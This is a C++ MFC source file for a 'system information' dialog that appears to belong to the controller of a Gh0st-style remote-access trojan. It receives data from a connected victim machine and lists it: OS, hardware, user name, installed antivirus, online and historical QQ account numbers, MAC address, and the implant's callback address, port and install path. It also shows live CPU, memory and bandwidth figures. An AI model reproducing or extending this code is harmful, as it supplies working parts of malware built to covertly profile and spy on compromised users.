// Systeminfo.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Systeminfo.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSysteminfo dialog


CSysteminfo::CSysteminfo(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSysteminfo::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSysteminfo)
	m_CpuUsed = _T("");
	m_Memory = _T("");
	m_Download = _T("");
	m_Upload = _T("");
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
// 	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));

	dwMem = dwCpu  = 0;

	m_bOnClose = FALSE;
}


void CSysteminfo::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSysteminfo)
	DDX_Control(pDX, IDC_PROGRESS_MEMORY, m_MemPross);
	DDX_Control(pDX, IDC_PROGRESS_CPU, m_CPUPross);
	DDX_Control(pDX, IDC_LIST, m_List);
	DDX_Text(pDX, IDC_SYSINFO_USECPU, m_CpuUsed);
	DDX_Text(pDX, IDC_SYSINFO_USEMEMORY, m_Memory);
	DDX_Text(pDX, IDC_STATIC_DOWNLOAD, m_Download);
	DDX_Text(pDX, IDC_STATIC_UPLOAD, m_Upload);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSysteminfo, CDialog)
	//{{AFX_MSG_MAP(CSysteminfo)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSysteminfo message handlers

void CSysteminfo::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SYSTEMINFO:
		ShowSysInfoList();
		break;
	case TOKEN_CPUMEMORY:
		{
/*
						//////////////// MEM//////////////////////////////////////////////////////////
						memcpy((void*)&dwMem,m_pContext->m_DeCompressionBuffer.GetBuffer(1),sizeof(DWORD));
						//////////////// CPU//////////////////////////////////////////////////////////
						memcpy((void*)&dwCpu,m_pContext->m_DeCompressionBuffer.GetBuffer(1)+sizeof(DWORD),sizeof(DWORD));
						//////////////// 上传//////////////////////////////////////////////////////////
						memcpy((void*)&Upload,m_pContext->m_DeCompressionBuffer.GetBuffer(1),sizeof(DWORD));
						//////////////// 下载//////////////////////////////////////////////////////////
						memcpy((void*)&Download,m_pContext->m_DeCompressionBuffer.GetBuffer(1),sizeof(DWORD));*/
			
			tagSysstatus m_SysTime;
			LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
			memcpy(&m_SysTime, lpBuffer , sizeof(tagSysstatus));
			//////////////// MEM//////////////////////////////////////////////////////////
			dwMem = m_SysTime.Mem;
			//////////////// CPU//////////////////////////////////////////////////////////
			dwCpu = m_SysTime.cpu;
			//////////////// 网速//////////////////////////////////////////////////////////
			Upload = m_SysTime.Bandout;
			Download = m_SysTime.Bandout_B;

		}
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

BOOL CSysteminfo::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format("\\\\%s - 系统信息", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);



	SetTimer(1, 1000, NULL);  //开启定时器 1

	AdjustList();
    ShowSysInfoList();

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CSysteminfo::AdjustList()
{

	RECT	rectClient;
	RECT	rectList;
	RECT	rectTab;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right - 0;
	rectList.bottom = rectClient.bottom - 100;
	m_List.MoveWindow(&rectList);
}

void CSysteminfo::ShowSysInfoList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_List.InsertColumn(0, "名称", LVCFMT_LEFT, 100);
	m_List.InsertColumn(1, "信息", LVCFMT_LEFT, 600);
	
	tagSystemInfo m_SysInfo;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&m_SysInfo, lpBuffer , sizeof(tagSystemInfo));
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDR_MAINFRAME));	
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_001));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_002));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_003));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_004));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_005));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_006));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_007));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_008));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_009));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_010));
	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);	

	CString str;
	CString strMemory,strDriveSize;
	strMemory.Format("共计:%dMB|可用:%dMB",m_SysInfo.szMemory,m_SysInfo.szMemoryFree);	
	strDriveSize.Format("共计:%ldG|可用:%ldG",m_SysInfo.szDriveSize,m_SysInfo.szDriveFreeSize);

	CString strGraphics,strMem;
	strGraphics.Format(m_SysInfo.szGraphics);
	strMem.Format(("  ->显存( %d MB)"),m_SysInfo.Memory7);
	m_List.InsertItem(0, _T("\\\\系统信息") , 0);
	m_List.InsertItem(1, _T("操作系统"),1);
	m_List.InsertItem(2, _T("CPU_速度:") , 1);
	m_List.InsertItem(3, _T("CPU 信息"),2);
	m_List.InsertItem(4, _T("内存大小"),3);
	m_List.InsertItem(5, _T("硬盘大小"),4);
	m_List.InsertItem(6, _T("当前用户"),5);
	m_List.InsertItem(7, _T("分 辨 率"),6);
	m_List.InsertItem(8, _T("运行时间"),7);
	m_List.InsertItem(9, _T("远程端口"),7);
	m_List.InsertItem(10, _T("是否双开"),8);
	m_List.InsertItem(11, _T("杀毒软件"),8);
	m_List.InsertItem(12, _T("在线 Q Q"),9);
	m_List.InsertItem(13, _T("历史 Q Q"),9);
	m_List.InsertItem(14, _T("MAC 地址"),10);
	m_List.InsertItem(15, _T("显卡信息"),10);
	m_List.InsertItem(16, _T(""), 77);
	m_List.InsertItem(17, _T("\\\\服务信息") , 0);
	m_List.InsertItem(18, _T("上线地址:") , 6);
	m_List.InsertItem(19, _T("连接端口:") , 4);
	m_List.InsertItem(20, _T("服务途径:"), 10);
	m_List.InsertItem(21, _T("系统路径:"), 10);

	m_List.SetItemText(1, 1, m_SysInfo.szSystemName);
	m_List.SetItemText(2, 1, m_SysInfo.szCpuSpeend);
	m_List.SetItemText(3, 1, m_SysInfo.szCpuInfo);
	m_List.SetItemText(4, 1, strMemory);
	m_List.SetItemText(5, 1, strDriveSize);
	m_List.SetItemText(6, 1, m_SysInfo.szUserName);
	m_List.SetItemText(7, 1, m_SysInfo.szScrSize);
	m_List.SetItemText(8, 1, m_SysInfo.szActiveTime);
	m_List.SetItemText(9, 1, m_SysInfo.szRemotePort);
	m_List.SetItemText(10, 1, m_SysInfo.szOpenInfo);
	m_List.SetItemText(11, 1, m_SysInfo.szUserVirus);
	m_List.SetItemText(12, 1, m_SysInfo.szQq);
	m_List.SetItemText(13, 1, m_SysInfo.szQQNums);
	m_List.SetItemText(14, 1, m_SysInfo.szMac);
	m_List.SetItemText(15, 1, strGraphics+strMem);
	m_List.SetItemText(18, 1, m_SysInfo.LineName);
	str.Format("%d",m_SysInfo.LinePort);
	m_List.SetItemText(19, 1,str);
	m_List.SetItemText(20, 1, m_SysInfo.Program);
	m_List.SetItemText(21, 1, m_SysInfo.szSystemdire);
	
	//更新窗口
	m_List.SetRedraw(TRUE); 
	m_List.Invalidate(); 
	m_List.UpdateWindow();	
	
}

void CSysteminfo::DeleteList()
{
	m_List.DeleteAllItems();	
	int nColumnCount= m_List.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_List.DeleteColumn(0);
	}
}

BOOL CSysteminfo::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	
	return CDialog::PreTranslateMessage(pMsg);
}

void CSysteminfo::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);
	
	m_bOnClose = TRUE;
	CDialog::OnClose();
}

void CSysteminfo::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(!m_bOnClose)
		OnClose();
	
	
	delete this;
	CDialog::PostNcDestroy();
}

void CSysteminfo::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	AdjustList();
}

void CSysteminfo::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	
	if (nIDEvent == 1)
	{
		m_MemPross.SetPos(dwMem);
		m_Memory.Format("%d MB",dwMem);
		
		m_CPUPross.SetPos(dwCpu);
		m_CpuUsed.Format("%d %%",dwCpu);

		m_Upload.Format("%.f Kb/s",Upload/1024.0);
		m_Download.Format("%.f Kb/s",Download/1024.0);


		UpdateData(false);
	}
	CDialog::OnTimer(nIDEvent);
}
